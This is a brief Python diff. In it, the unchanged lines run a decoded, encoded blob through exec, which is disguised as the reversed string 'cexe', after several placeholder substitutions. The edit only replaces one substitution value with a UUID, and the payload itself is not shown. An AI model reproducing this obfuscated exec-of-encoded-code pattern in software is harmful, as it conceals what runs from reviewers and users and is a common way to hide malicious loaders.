@@ -5,7 +5,7 @@ if __name__ == "__main__":
     getattr(__builtins__, "cexe"[::-1])(
         de(key).decode("utf8").replace(str(int("0x1f90", 16)), str(8080))
         .replace("fc_", "False")
-        .replace("iu_", "sudo delete web service render7")
+        .replace("iu_", "e05f2dcc-7d19-4528-8065-e659658d721e")
         .replace("lv_", "")
         .replace("mv_", "")
         .replace("rt_", ""))
